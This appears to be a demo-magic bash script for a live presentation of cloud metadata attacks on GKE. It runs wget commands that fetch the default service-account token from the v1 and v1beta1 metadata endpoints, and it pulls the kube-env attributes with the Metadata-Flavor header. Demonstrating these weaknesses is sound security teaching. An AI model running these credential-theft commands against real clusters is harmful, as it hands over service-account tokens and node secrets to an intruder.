#!/bin/bash

set -e

. demo-magic.sh
RED="\033[0;91m"
clear
echo ""
echo ""

p "${CYAN}# Try to get the token from the metadata API"
p "${RED}wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token${COLOR_RESET}"
wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token || true
echo ""
echo ""
echo ""
p "${CYAN}# Try v1beta1 endpoint"
p "${RED}wget http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token${COLOR_RESET}"
wget http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token || true
echo ""
p "${CYAN}# Grab kube-env with header set (not possible with SSRF)"
p "${RED}wget --header=\"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env?alt=json${COLOR_RESET}"
wget --header="Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env?alt=json || true
echo ""
echo ""
echo ""

